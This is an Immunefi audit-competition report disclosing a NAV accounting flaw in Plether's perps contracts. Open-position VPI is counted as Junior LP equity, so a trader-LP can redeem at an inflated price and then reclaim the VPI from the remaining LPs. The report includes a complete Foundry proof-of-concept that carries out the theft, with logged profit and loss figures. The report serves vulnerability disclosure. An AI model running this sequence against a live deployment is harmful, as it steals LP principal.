# \#99719 [SC-Critical] Incorrect NAV accounting (refundable VPI counted as LP equity) lets a trader-LP steal incumbent Junior LP principal

**Submitted on Nov 14th 2026 at 22:56:24 UTC by @nikki1337 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99719
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
Junior LP NAV treats the VPI (skew charge) that a trader pays when opening a position as LP-owned equity straight away, even though the same position gets that VPI back when it closes and reduces the skew. An account that is a Junior LP, a trader and a keeper at the same time can open a large skew-increasing position about a minute before its own Junior redemption is priced, redeem at the inflated NAV, and then close the position to take the VPI back. The refund is paid by the Junior LPs who stayed. Using only public entrypoints, with no trusted-role action during the attack and no price movement.

## Vulnerability Details

### Background

- VPI is the skew charge. A trade that increases absolute long/short skew pays a positive amount to the pool; a trade that reduces skew receives a rebate. It is the difference of a potential `C(S) = k·S² / 2D`, so at unchanged depth a sequence of trades telescopes (`WHITEPAPER.md:852`): reversing the same skew returns the same amount. Each position records what it has paid in `vpiAccrued`.
- LP deposits and redemptions are asynchronous. At each hourly LP epoch, anyone can call `Router.settleLpEpoch`, which reconciles the pool (books revenue and losses into tranche principal) and then funds matured redemptions at the resulting NAV.
- Junior receives residual revenue and takes losses first. Senior is not affected by this issue.

### Root cause

**1. VPI paid at open is booked as LP revenue at once.** The open's trade cost is the VPI plus the execution fee (`OpenAccountingLib.sol:135`). The open settlement credits the pool with that cost minus the fee credited to the treasury, i.e. with the VPI, as claimant revenue with cash arrived:

```solidity
// CfdEngineSettlementSidecar.sol:454-464 (open settlement)
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

`HousePool.recordClaimantInflow` adds it to `accountedAssets` (`HousePool.sol:640-642`). The next reconcile distributes it through the waterfall: first to restore Senior to its high-water mark, then to Junior. 

**2. LP NAV has no term for refundable open-position VPI.** The NAV that prices both Junior deposits and Junior redemptions is built in `buildReconcileSnapshot` from physical assets, the terminal price delta and trader claims. The terminal price delta is evaluated from per-account price curves whose only stored inputs are lots, entry cost, collectible cap and side (`ITerminalNavBookV2.CurveRecord`; `TerminalNavBookV2.sol:320-349`). No part of this path reads any position's `vpiAccrued`:

```solidity
// CfdEngineProtocolLens.sol:70 (getHousePoolInputSnapshot)
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;

// HousePoolAccountingLib.sol:60-78 (buildReconcileSnapshot)
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    // This form also handles `type(int256).min` without negating it directly.
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}

if (terminalAssets >= terminalLiabilities) {
    snapshot.distributable = terminalAssets - terminalLiabilities;
} else {
    snapshot.deficit = terminalLiabilities - terminalAssets;
}
```

**3. That VPI is refundable to the same position.** A skew-reducing close computes a fresh curve rebate. Because VPI is a potential difference, reversing the same skew at the same depth gives back the amount paid at open:

```solidity
// CfdMath.sol:170-179 (tryCalculateVPI)
(bool preValid, uint256 preCost) = tryGetSkewCost(preSkewAssets, depthAssets, vpiFactorWad);
...
(bool postValid, uint256 postCost) = tryGetSkewCost(postSkewAssets, depthAssets, vpiFactorWad);
...
return (true, int256(postCost) - int256(preCost));
```

The lifetime clamp then caps the rebate at the VPI the position paid (pro rata to the size closed), so the pool refunds up to `vpiAccrued`:

```solidity
// CloseAccountingLib.sol:103-118 (buildCloseState)
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
...
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

So a positive `vpiAccrued` on an open position is money the pool may have to pay back, yet NAV records it as equity the LPs own.

**4. Redemptions are priced after the reconcile.** `_settleLpEpoch` reconciles first and then prices the Junior redemption phase on the post-reconcile principal (`HousePool.sol:835-841`; funding follows at `:846-891`):

```solidity
// HousePool.sol:835-841
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

result.cutoffEpoch = cutoffEpoch;
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

Whoever holds Junior shares while NAV includes refundable VPI, and redeems before the refund is paid, takes part of that VPI from the LPs who stay. When the position later closes, the refund is paid out of the pool and booked as a Junior-first loss.


## Impact Details
**Selected impact: Critical — "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield".**

Any account with enough capital can take Junior LP funds held by `HousePool`, using only public functions, with no trusted role involved and no price movement. The attacker holds Junior shares, opens a large position that pays VPI just before its own redemption is priced, cashes out at a NAV that counts that VPI as LP money, and then closes the position to get the VPI back from the pool.

- **Who loses:** the Junior LPs who stay in the pool, and any new Junior LP who deposits while the NAV is inflated. They fund the refund of VPI that the attacker has already taken out through its redemption, so the loss comes out of their deposited capital, not just their earnings.
- **Who gains:** the attacker, who gets all of its capital back plus a profit. Senior LPs are not affected.
- **How often:** every LP cycle (a few hours), again and again, for as long as the pool can fund the attacker's redemption.


## References
- `packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L464`: open settlement books VPI as LP revenue
- `packages/perps/src/HousePool.sol#L640-L642`: revenue added to `accountedAssets`
- `packages/perps/src/HousePool.sol#L835-L891`: `_settleLpEpoch` reconciles, then prices and funds redemptions
- `packages/perps/src/CfdEngineProtocolLens.sol#L59-L89` (L70): LP NAV input snapshot
- `packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78`: `buildReconcileSnapshot`
- `packages/perps/src/TerminalNavBookV2.sol#L320-L349`: terminal LP price delta (no VPI input)
- `packages/perps/src/CfdMath.sol#L164-L180`: VPI as a potential difference
- `packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118`: close rebate and lifetime clamp


## Proof of Concept

## Proof of Concept

```bash
# legacy codegen, faster compile
FOUNDRY_VIA_IR=false forge test --root packages/perps --match-path test/poc/submission/PoC_C01_VpiNavAttack.t.sol -vv

# default profile (via-IR), slower compile
forge test --root packages/perps --match-path test/poc/submission/PoC_C01_VpiNavAttack.t.sol -vv
```

### Test file: `packages/perps/test/poc/submission/PoC_C01_VpiNavAttack.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PocReleaseBase} from "../PocReleaseBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";

/// @notice Junior LP NAV counts refundable open-position VPI as LP equity.
///         One account (Junior LP + trader + keeper) deposits into Junior and queues a redemption. About a minute
///         before the redemption is priced it opens a skew-increasing LONG, paying VPI V into the pool. It settles the
///         LP epoch itself, so its shares are redeemed at a NAV that includes V, then closes the LONG and takes V back.
///         The Junior LPs who stay pay the refund.
/// Run (repo root): [FOUNDRY_VIA_IR=false] forge test --root packages/perps \
///                  --match-path test/poc/submission/PoC_C01_VpiNavAttack.t.sol -vv
/// Release parameters via PocReleaseBase (vpi 0.01e18, maxSkew 0.4, fee 4 bps, Senior cap 40M / 80%, adverse 2500).
/// Actors: `trader` = attacker (one EOA, every step is its own public call); `juniorLp` + the Junior seed owner =
///         incumbent Junior LPs (victims); `seniorLp` = Senior LP.
contract VpiNavAttackTest is PocReleaseBase {

    uint256 internal constant SENIOR_TOTAL = 40_000_000e6; // Senior S = H = 40M (Senior LP + 1 USDG seed)
    uint256 internal constant INCUMBENT_JUNIOR = 10_000_000e6; // incumbent Junior LP (+ 1 USDG Junior seed)
    uint256 internal constant ATTACKER_JUNIOR = 40_000_000e6; // attacker's Junior deposit
    uint256 internal constant POSITION_TOKENS = 36_000_000; // LONG 36M notional at basket 1.00 (= 0.4 * pool depth)
    uint256 internal constant TRADING_COLLATERAL = 442_000e6; // 1.2% of 36M + 10,000 USDG

    /// @dev Values observed during the attack.
    struct Obs {
        int256 attackerStart; // attacker's total value before the deposit request
        uint256 epochD; // LP epoch of the attacker's Junior deposit
        uint256 shares; // Junior shares the attacker receives
        uint256 epochR; // LP epoch at which the attacker's redemption is priced
        uint256 incumbentBefore; // incumbent Junior value right before the open
        uint256 sharesValueBefore; // value of the attacker's shares right before the open
        uint256 vpi; // VPI the attacker pays at the open (V)
        uint256 attackerShare; // attacker's share of Junior when the redemption is priced (1e18 = 100%)
        uint256 poolRefund; // pool outflow at the close
        uint256 redeemed; // USDG the attacker receives for its Junior shares
        uint256 incumbentAfter; // incumbent Junior value after the close
        int256 attackerProfit; // attacker's total value at the end minus at the start
    }

    function _pocJuniorLiquidity() internal pure override returns (uint256) {
        return 0;
    }

    function _pocSeniorLiquidity() internal pure override returns (uint256) {
        return 0;
    }

    function _pocTraderDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        vm.deal(trader, 100 ether); // the attacker pays its own Pyth update fees as keeper
    }

    function test_TraderLpRedeemsAtInflatedNavThenTakesVpiBack() public {
        Obs memory o;

        // Setup: an ordinary pool at release parameters, filled through the public async LP path.
        _lpDeposit(juniorVault, juniorLp, INCUMBENT_JUNIOR);
        _lpDeposit(seniorVault, seniorLp, SENIOR_TOTAL - pool.seniorPrincipal());
        assertEq(pool.seniorHighWaterMark(), pool.seniorPrincipal(), "Senior is unimpaired (S == H)");
        settlementToken.mint(trader, ATTACKER_JUNIOR);
        _fundTrader(trader, TRADING_COLLATERAL);

        _enterJuniorAndQueueRedemption(o); // steps 1-3
        _openBeforeRedemptionIsPriced(o); // steps 4-5
        _settleCloseAndExit(o); // steps 6-8
        _logAndAssertHarm(o);
    }

    /// @dev Steps 1-3: become the majority Junior LP and queue a full redemption.
    function _enterJuniorAndQueueRedemption(
        Obs memory o
    ) internal {
        address attacker = trader;

        // Step 1 (D - 50 min): request a Junior deposit for the next LP epoch D.
        _advanceTo(pool.lpEpochStart(pool.currentLpEpoch() + 1) + 10 minutes);
        o.attackerStart = _attackerValue(attacker);
        vm.startPrank(attacker);
        settlementToken.approve(address(juniorVault), ATTACKER_JUNIOR);
        o.epochD = juniorVault.requestDeposit(ATTACKER_JUNIOR, attacker, attacker);
        vm.stopPrank();

        // Step 2 (D + 1 s): settle epoch D (permissionless) and claim the Junior shares.
        _advanceTo(pool.lpEpochStart(o.epochD));
        _settleAs(attacker);
        o.shares = _lpClaimDeposit(juniorVault, attacker, o.epochD);

        // Step 3 (after the 1 h deposit cooldown): queue a redemption of all shares; it is priced at epoch R = D + 2.
        _advanceTo(juniorVault.depositEpochActivationTime(o.epochD) + juniorVault.DEPOSIT_COOLDOWN() + 1);
        o.epochR = _lpRequestRedeem(juniorVault, attacker, o.shares);
        assertEq(o.epochR, o.epochD + 2, "the redemption is priced at epoch D + 2");
    }

    /// @dev Steps 4-5: open a LONG at the maximum skew about a minute before the redemption is priced.
    function _openBeforeRedemptionIsPriced(
        Obs memory o
    ) internal {
        address attacker = trader;
        uint256 r = pool.lpEpochStart(o.epochR);

        // Step 4 (R - 61 s): refresh the mark and commit a LONG at the maximum skew, with 1% margin.
        _advanceTo(r - 62);
        _refreshMarkAs(attacker);
        o.incumbentBefore = _incumbentValue();
        o.sharesValueBefore = juniorVault.convertToAssets(o.shares);
        uint64 openId = _commitOpen(attacker, CfdTypes.Side.LONG, POSITION_TOKENS * 1e18, POSITION_TOKENS * 1e4);

        // Step 5 (R - 59 s): execute the open as keeper (next block, price published after the commit).
        _assertExecuted(_executeAs(attacker, openId));
        (,,,,,, int256 vpiAccrued) = engine.positions(attacker);
        assertGt(vpiAccrued, 0, "the open paid positive VPI into the pool");
        o.vpi = uint256(vpiAccrued);
        o.attackerShare = (o.shares * 1e18) / juniorVault.totalSupply();
    }

    /// @dev Steps 6-8: let the redemption be priced, close the LONG for the VPI refund, then exit completely.
    function _settleCloseAndExit(
        Obs memory o
    ) internal {
        address attacker = trader;

        // Step 6 (R + 1 s): settle epoch R. The reconcile counts V in Junior NAV, then funds the attacker's redemption.
        _advanceTo(pool.lpEpochStart(o.epochR));
        _settleAs(attacker);

        // Step 7 (R + 2 s commit, R + 4 s execute): close the LONG. The skew-reducing close refunds the VPI.
        _advance(1);
        uint256 poolBeforeClose = pool.totalAssets();
        uint64 closeId = _commitClose(attacker, CfdTypes.Side.LONG, POSITION_TOKENS * 1e18);
        _assertExecuted(_executeAs(attacker, closeId));
        assertEq(_positionSize(attacker), 0, "the attacker is flat");
        o.poolRefund = poolBeforeClose - pool.totalAssets();

        // Step 8: claim the redemption and withdraw all trading collateral.
        o.redeemed = _lpClaimRedeem(juniorVault, attacker, o.epochR);
        uint256 settlement = clearinghouse.balanceAssets(attacker);
        vm.prank(attacker);
        clearinghouse.withdraw(attacker, settlement);

        o.incumbentAfter = _incumbentValue();
        o.attackerProfit = _attackerValue(attacker) - o.attackerStart;
    }

    function _logAndAssertHarm(
        Obs memory o
    ) internal {
        emit log_named_decimal_uint("Attacker share of Junior when the redemption is priced", o.attackerShare, 18);
        emit log_named_decimal_uint("VPI paid by the attacker at the open (V)", o.vpi, 6);
        emit log_named_decimal_uint("Attacker's Junior shares, value before the open", o.sharesValueBefore, 6);
        emit log_named_decimal_uint("Attacker's Junior shares, redemption paid", o.redeemed, 6);
        emit log_named_decimal_uint(
            "Pool outflow at the close (VPI refund net of close fee and spread)", o.poolRefund, 6
        );
        emit log_named_decimal_uint("Incumbent Junior LPs, value before the open", o.incumbentBefore, 6);
        emit log_named_decimal_uint("Incumbent Junior LPs, value after the close", o.incumbentAfter, 6);
        if (o.incumbentAfter < o.incumbentBefore) {
            emit log_named_decimal_uint("INCUMBENT JUNIOR LOSS", o.incumbentBefore - o.incumbentAfter, 6);
        }
        emit log_named_decimal_int("ATTACKER PROFIT (start to end, all fees paid)", o.attackerProfit, 6);

        assertGt(
            o.redeemed, o.sharesValueBefore, "the attacker redeemed above what its shares were worth before the open"
        );
        assertLt(o.incumbentAfter, o.incumbentBefore, "the incumbent Junior LPs lost value");
        assertGt(
            o.incumbentBefore - o.incumbentAfter,
            ((1e18 - o.attackerShare) * o.vpi) / 1e18,
            "the incumbents lost more than all the VPI ever credited to them"
        );
        assertGt(o.attackerProfit, 0, "the attacker ends with more than it started with");
        assertEq(juniorVault.balanceOf(trader), 0, "the attacker has fully left Junior");
        assertEq(clearinghouse.balanceAssets(trader), 0, "the attacker has withdrawn all trading collateral");
    }

    // ------------------------------------------------------------------ public-path helpers (attacker as keeper)

    /// @dev Router.updateMarkPrice with a live basket at 1.00 published now.
    function _refreshMarkAs(
        address who
    ) internal {
        _advance(1);
        bytes[] memory data = _payload(ONE_BASKET, _now(), _now() - 1);
        uint256 fee = releaseOracle.getUpdateFee(data);
        vm.prank(who);
        router.updateMarkPrice{value: fee}(data);
    }

    /// @dev Router.settleLpEpoch (permissionless) with a live basket at 1.00 published now.
    function _settleAs(
        address who
    ) internal {
        _advance(1);
        bytes[] memory data = _payload(ONE_BASKET, _now(), _now() - 1);
        uint256 fee = releaseOracle.getUpdateFee(data);
        vm.prank(who);
        router.settleLpEpoch{value: fee}(data);
    }

    /// @dev Router.executeOrder in the next block, with a basket at 1.00 published 1 s after the commit.
    function _executeAs(
        address who,
        uint64 orderId
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        require(pending.orderId == orderId, "order not pending");
        uint64 tick = pending.commitTime + 1;
        _advanceTo(tick + 1);
        bytes[] memory data = _payload(ONE_BASKET, tick, pending.commitTime);
        uint256 fee = releaseOracle.getOrderExecutionFee(data);
        vm.prank(who);
        result = router.executeOrder{value: fee}(orderId, data);
    }

    // ------------------------------------------------------------------ valuation

    /// @dev Value of the incumbent Junior LPs' shares at the vault's current share price.
    function _incumbentValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(juniorLp) + juniorVault.balanceOf(address(this)));
    }

    /// @dev Attacker wallet + clearinghouse balance + trader claim + Junior shares held, at the share price. Measured
    ///      before the deposit request and after the final withdrawal, when no shares sit in the redemption queue.
    function _attackerValue(
        address attacker
    ) internal view returns (int256) {
        return int256(
            settlementToken.balanceOf(attacker) + clearinghouse.balanceAssets(attacker)
                + engine.traderClaimBalanceAssets(attacker)
                + juniorVault.convertToAssets(juniorVault.balanceOf(attacker))
        );
    }

}
```

### Output

Legacy codegen; the via-IR run prints the same values.

```text
Ran 1 test for test/poc/submission/PoC_C01_VpiNavAttack.t.sol:VpiNavAttackTest
[PASS] test_TraderLpRedeemsAtInflatedNavThenTakesVpiBack() (gas: 8125012)
Logs:
  Attacker share of Junior when the redemption is priced: 0.800011673678852973
  VPI paid by the attacker at the open (V): 71996.406445
  Attacker's Junior shares, value before the open: 39999420.539054
  Attacker's Junior shares, redemption paid: 40057732.042014
  Pool outflow at the close (VPI refund net of close fee and spread): 55798.174964
  Incumbent Junior LPs, value before the open: 9999125.551050
  Incumbent Junior LPs, value after the close: 9957005.683809
  INCUMBENT JUNIOR LOSS: 42119.867241
  ATTACKER PROFIT (start to end, all fees paid): 27134.169813

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 55.49ms (16.73ms CPU time)
```

